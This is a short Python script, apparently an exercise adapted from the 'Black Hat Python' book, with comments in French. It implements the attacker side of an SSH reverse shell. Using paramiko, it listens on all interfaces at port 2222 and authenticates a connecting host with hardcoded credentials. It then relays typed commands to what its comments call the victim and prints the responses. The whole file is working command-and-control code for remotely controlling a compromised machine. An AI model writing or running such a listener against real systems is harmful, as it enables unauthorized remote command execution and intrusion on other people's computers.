import os
import paramiko
import socket
import sys
import threading

# On récupère la clé RSA générée précédemment
CWD = os.path.dirname(os.path.realpath(__file__))
HOST_KEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'achraf') and (password == 'BHP'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

def start_server(server_ip, server_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server_ip, server_port))
        sock.listen(100)
        
        print(f'[+] Listening for connection on {server_ip}:{server_port} ...')
        
        client, addr = sock.accept()
        print(f'[+] Got a connection from {addr[0]}:{addr[1]}')

        bhSession = paramiko.Transport(client)
        bhSession.add_server_key(HOST_KEY)
        server = Server()
        
        try:
            bhSession.start_server(server=server)
        except paramiko.SSHException:
            print('[-] SSH Negotiation Failed.')
            return

        chan = bhSession.accept(20)
        if chan is None:
            print('*** No channel.')
            return

        print('[+] Authenticated!')
        # On attend le signal "ClientConnected"
        print(chan.recv(1024).decode()) 
        chan.send('Welcome to bh_ssh')
        
        while True:
            try:
                # 1. Tu tapes ta commande ici (Attaquant)
                command = input("Enter command: ").strip()
                
                if command != 'exit':
                    # 2. On l'envoie à la victime
                    chan.send(command)
                    # 3. On affiche sa réponse
                    print(chan.recv(8192).decode())
                else:
                    chan.send('exit')
                    print('Exiting')
                    bhSession.close()
                    break
            except KeyboardInterrupt:
                bhSession.close()
    except Exception as e:
        print(f'[-] Error: {e}')

if __name__ == '__main__':
    start_server('0.0.0.0', 2222)
